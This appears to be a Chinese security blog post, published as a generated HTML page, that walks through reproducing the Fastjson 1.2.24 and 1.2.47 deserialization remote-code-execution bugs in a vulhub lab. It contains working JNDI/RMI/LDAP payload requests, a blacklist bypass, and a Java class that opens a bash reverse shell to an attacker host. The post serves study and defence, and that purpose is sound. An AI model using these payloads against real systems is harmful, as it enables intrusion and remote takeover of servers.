@@ -1,0 +1,1405 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Fastjson反序列化漏洞, Made by jcxj">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Fastjson反序列化漏洞 | Made by jcxj</title>
+    <link rel="icon" type="image/png" href="/jcxj/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/jcxj/css/my.css">
+
+    <script src="/jcxj/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/jcxj/" class="waves-effect waves-light">
+                    
+                    <img src="/jcxj/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Made by jcxj</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/jcxj/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/jcxj/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Made by jcxj</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/jcxj/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/jcxj/medias/featureimages/20.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">Fastjson反序列化漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/jcxj/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/jcxj/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                <span class="chip bg-color">反序列化</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/jcxj/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                反序列化
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-10-07
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
+                    2022-10-07
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    1.8k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    9 Min
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/jcxj/libs/prism/prism.css">
+        
+
+        
+        <!-- 代码块折行 -->
+        <style type="text/css">
+            code[class*="language-"], pre[class*="language-"] { white-space: pre-wrap !important; }
+        </style>
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="1-2-24版本"><a href="#1-2-24版本" class="headerlink" title="1.2.24版本"></a>1.2.24版本</h2><h3 id="复现环境-vulhub"><a href="#复现环境-vulhub" class="headerlink" title="复现环境:vulhub"></a>复现环境:vulhub</h3><pre class="line-numbers language-none"><code class="language-none">&lt;&#x3D;1.2.24
+&lt;&#x3D;1.2.47<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007104221037.png" class="" title="image-20221007104221037">
+
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007104305305.png" class="" title="image-20221007104305305">
+
+<h2 id="一-fastjson介绍"><a href="#一-fastjson介绍" class="headerlink" title="一.fastjson介绍"></a>一.fastjson介绍</h2><h3 id="1-fastjson是什么"><a href="#1-fastjson是什么" class="headerlink" title="1.fastjson是什么?"></a>1.fastjson是什么?</h3><p>阿里巴巴维护的一个框架</p>
+<img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007104358451.png" class="" title="image-20221007104358451">
+
+<p>fastjson是json的一个工具库</p>
+<img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007104734426.png" class="" title="image-20221007104734426">
+
+<h3 id="序列化的结果"><a href="#序列化的结果" class="headerlink" title="序列化的结果"></a>序列化的结果</h3><img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007111855873.png" class="" title="image-20221007111855873">
+
+<h3 id="反序列化的方法"><a href="#反序列化的方法" class="headerlink" title="反序列化的方法"></a>反序列化的方法</h3><p>第一个会返回user的对象,因为函数里已经说明了</p>
+<p>第二个只会返回object对象,导致类型丢失</p>
+<img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007112220959.png" class="" title="image-20221007112220959">
+
+<p><strong>java反序列化中会导致类型丢失,不像php(序列化后保存类型),因此fastjason提供了自省的操作来导入类型</strong>，<strong>这也是导致漏洞点的原因</strong></p>
+<p>自省:autotype,@type</p>
+<img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007181011559.png" class="" title="image-20221007181011559">
+
+<h3 id="利用类"><a href="#利用类" class="headerlink" title="利用类"></a>利用类</h3><img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007181349095.png" class="" title="image-20221007181349095">
+
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007184509709.png" class="" title="image-20221007184509709">
+
+<h4 id="1-vulhub启动靶场"><a href="#1-vulhub启动靶场" class="headerlink" title="1.vulhub启动靶场"></a>1.vulhub启动靶场</h4><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;vul_hub&#x2F;&#x2F;fastjson&#x2F;1.2.24-rce
+docker-compose up -d
+#-d 可加可不加,b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2-攻击机攻击步骤"><a href="#2-攻击机攻击步骤" class="headerlink" title="2.攻击机攻击步骤"></a>2.攻击机攻击步骤</h4><pre class="line-numbers language-none"><code class="language-none">1.nc -lvp 9001
+2.编写恶意代码LinuxTouch,编译为class
+python -m http.server 8089 #python3
+#提供一个路径,来个别人下载恶意程序
+3.开启RMI服务,引导访问者下载LinuxTouch文件,相当于一个指路人
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar
+marshalsec.jndi.RMIRefServer &quot;httP:&#x2F;&#x2F;ip:8089&#x2F;#LinuxTouch&quot; 9473
+#9473是RMI监听的端口
+#marshalsec-0.0.3-SNAPSHOT-all.jar是github上开源的恶意jar包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="在编写恶意代码LinuxTouch的时候-需要把LinuxTouch-java放到jdk1-8的bin目录下编译"><a href="#在编写恶意代码LinuxTouch的时候-需要把LinuxTouch-java放到jdk1-8的bin目录下编译" class="headerlink" title="在编写恶意代码LinuxTouch的时候,需要把LinuxTouch.java放到jdk1.8的bin目录下编译"></a>在编写恶意代码LinuxTouch的时候,需要把LinuxTouch.java放到jdk1.8的bin目录下编译</h5><p>原因:直接用javac编译会带有包名,而服务器中不会有这个包</p>
+<p>LinuxTouch.java的源码如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">public class LinuxTouch &#123;
+    public LinuxTouch()&#123;
+        try&#123;
+            Runtime.getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;fast-success.txt&quot;);
+            &#x2F;&#x2F;能执行touch就能执行反弹shell的命令,这里以touch命令为例
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+    public static void main(String[] argv)&#123;
+        LinuxTouch e &#x3D; new LinuxTouch();
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="3-启动bp，发送一个恶意请求"><a href="#3-启动bp，发送一个恶意请求" class="headerlink" title="3.启动bp，发送一个恶意请求"></a>3.启动bp，发送一个恶意请求</h4><p>postman或hackbar也都行</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
+Host: 192.168.142.128:8090
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application&#x2F;json
+Content-Length: 146
+&#123; 
+&quot;b&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxTouch&quot;, &quot;autoCommit&quot;: true
+&#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">源码解析:
+&quot;b&quot;:随便起的名字,无所谓
+&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; 自省操作,这个类下面某个函数具有漏洞
+&quot;dataSourceName&quot;: &quot;rmi:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxTouch&quot; 当区9473下载LinuxTouch的时候,这个网页会告诉服务器去kali的8089下载恶意程序Linuxtouch
+&quot;autoCommit&quot;: true 默认不使用autoCommit,因为com.sun.rowset.jdbcRowSetImpl没加入黑名单了;这一句的作用是黑名单绕过
+黑名单绕过参考链接:
+https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;UcYxH_r7N6N4vqldFEVktg
+https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;EuRSAJFjnd7Dze-26qFJNA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="复现不成功的几个原因"><a href="#复现不成功的几个原因" class="headerlink" title="复现不成功的几个原因"></a>复现不成功的几个原因</h3><pre class="line-numbers language-none"><code class="language-none">1、JDK11编译的class放到靶场JDK8的环境，不能运行
+2、java源代码不能有包名（package name）
+3、用python启动HTTP而不是Apache
+4、docker-compose up不带-d可以看到日志<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="利用流程（原理）"><a href="#利用流程（原理）" class="headerlink" title="利用流程（原理）"></a>利用流程（原理）</h3><img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007210942349.png" class="" title="image-20221007210942349">
+
+<h4 id="1-setDataSourceName源码"><a href="#1-setDataSourceName源码" class="headerlink" title="1.setDataSourceName源码"></a>1.setDataSourceName源码</h4><p>当反序列化的时候,会自动调用setxxxx()函数来进行赋值</p>
+<pre class="line-numbers language-none"><code class="language-none"> public void setDataSourceName(String dsName) throws SQLException&#123;
+
+       if(getDataSourceName() !&#x3D; null) &#123;
+          if(!getDataSourceName().equals(dsName)) &#123;
+             super.setDataSourceName(dsName);
+             conn &#x3D; null;
+             ps &#x3D; null;
+             rs &#x3D; null;
+          &#125;
+       &#125;
+       else &#123;
+          super.setDataSourceName(dsName);
+       &#125;
+    &#125;
+&#x2F;&#x2F;super.setDataSourceName(dsName);这一句就是单纯的赋值,dsName &#x3D; rmi:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxTouch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="2-setAutoCommit源码"><a href="#2-setAutoCommit源码" class="headerlink" title="2.setAutoCommit源码"></a>2.setAutoCommit源码</h4><p><strong>漏洞发生的地方</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">public void setAutoCommit(boolean autoCommit) throws SQLException &#123;
+        if(conn !&#x3D; null) &#123;
+           conn.setAutoCommit(autoCommit);
+        &#125; else &#123;
+
+           conn &#x3D; connect();
+
+           conn.setAutoCommit(autoCommit);
+
+        &#125;
+    &#125;
+    &#x2F;&#x2F;conn &#x3D; connect(); 攻击源在这一句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>connect()源码</p>
+<pre class="line-numbers language-none"><code class="language-none">private Connection connect() throws SQLException &#123;
+
+       if(conn !&#x3D; null) &#123;
+           return conn;
+
+       &#125; else if (getDataSourceName() !&#x3D; null) &#123;
+
+           try &#123;
+               Context ctx &#x3D; new InitialContext();
+          
+               DataSource ds &#x3D; (DataSource)ctx.lookup
+                   (getDataSourceName()); 
+                   
+               if(getUsername() !&#x3D; null &amp;&amp; !getUsername().equals(&quot;&quot;)) &#123;
+                    return ds.getConnection(getUsername(),getPassword());
+               &#125; else &#123;
+                    return ds.getConnection();
+               &#125;
+           &#125;
+           catch (javax.naming.NamingException ex) &#123;
+               throw new SQLException(resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
+           &#125;
+
+       &#125; else if (getUrl() !&#x3D; null) &#123;
+
+           return DriverManager.getConnection
+                   (getUrl(), getUsername(), getPassword());
+       &#125;
+       else &#123;
+           return null;
+       &#125;
+
+   &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;lookup:JNDI用于查找资源的一种方法,可以查找rmi资源                
+                DataSource ds &#x3D; (DataSource)ctx.lookup
+                    (getDataSourceName()); &#x2F;&#x2F;getDataSourceName() 这个函数的返回值就是DataSourceName,也就是我们传进去的rmi:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxTouch
+一旦lookup去查找rmi:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxTouch,这个地址就会告诉lookup去下载8089端口下的LinuxTouch这个恶意文件           <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>了解原理后回到这个反序列化的payload</p>
+<pre class="line-numbers language-none"><code class="language-none">&quot;b&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxTouch&quot;, &quot;autoCommit&quot;: true
+&#125;
+#&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; 利用自省来避免类型丢失
+#rmi:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxTouch 初始化dataSourceName,为了让lookup去访问这个地址
+#autoCommit lookup在conn()中,conn()在setAutoCommit(),当反序列化的时候,如果autoCommit有值,就会自动调用setAutoCommit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="1-2-47版本"><a href="#1-2-47版本" class="headerlink" title="1.2.47版本"></a>1.2.47版本</h2><h3 id="docker搭建环境"><a href="#docker搭建环境" class="headerlink" title="docker搭建环境"></a>docker搭建环境</h3><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;fastjson&#x2F;1.2.47-rce
+docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="攻击机攻击步骤"><a href="#攻击机攻击步骤" class="headerlink" title="攻击机攻击步骤"></a>攻击机攻击步骤</h3><p><strong>刚才是RMI服务,现在是LDAP服务</strong>,<strong>LinuxTouch.java换成LinuxRevers.java</strong></p>
+<p><strong>LinuxRevers.java源码</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">public class LinuxRevers &#123;
+    static &#123;
+        try &#123;
+            Runtime rt &#x3D; Runtime.getRuntime();
+            String[] commands &#x3D; &#123;&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.142.132&#x2F;9001 0&gt;&amp;1&quot;&#125;;
+            Process pc &#x3D; rt.exec(commands);
+            pc.waitFor();
+        &#125; catch (Exception e) &#123;
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>编译也是拿到jdk1.8的bin目录下编译</strong></p>
+<img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007214731756.png" class="" title="image-20221007214731756">
+
+<h3 id="攻击payload如下"><a href="#攻击payload如下" class="headerlink" title="攻击payload如下"></a>攻击payload如下</h3><pre class="line-numbers language-none"><code class="language-none">POST &#x2F; HTTP&#x2F;1.1
+Host: 192.168.142.128:8090
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko&#x2F;20100101 Firefox&#x2F;98.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application&#x2F;json
+Content-Length: 268
+&#123;&quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+&#125;,&quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxRevers&quot;, &quot;autoCommit&quot;:true
+&#125;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+#为什么不直接发b? 因为b在黑名单里,不能直接用; 这一句就是利用缓存的机制,提前引入JdbcRowSetImpl类来绕过黑名单
+#&quot;@type&quot;:&quot;java.lang.Class&quot; 引入某个类,这个类下面有个val的值
+#&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,setVal能够将JdbcRowSetImpl类放到缓存中,实现黑名单绕过
+
+&quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;192.168.142.132:9473&#x2F;LinuxRevers&quot;, &quot;autoCommit&quot;:true
+&#125; 这个和1.2.24版本一样,就不多说了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><pre class="line-numbers language-none"><code class="language-none">1、找到发送JSON序列化数据的接口
+2、判断是否使用fastjon
+1）非法格式报错
+&#123;&quot;x&quot;:&quot;
+2）使用dnslog探测
+&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;
+,
+&quot;val&quot;:&quot;xxx.dnslog.cn&quot;&#125;&#125;
+Burp 插件
+https:&#x2F;&#x2F;github.com&#x2F;zilong3033&#x2F;fastjsonScan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007220401919.png" class="" title="image-20221007220401919">
+
+<p><strong>为什么升级jdk可以修复漏洞?</strong></p>
+<img src="/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/image-20221007220529226.png" class="" title="image-20221007220529226">
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/jcxj/about" rel="external nofollow noreferrer">jcxj</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jcxj.github.io/jcxj/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/">https://jcxj.github.io/jcxj/jcxj/2022/10/07/fastjson-fan-xu-lie-hua/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/jcxj/about" target="_blank">jcxj</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/jcxj/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                                    <span class="chip bg-color">反序列化</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/jcxj/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/jcxj/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
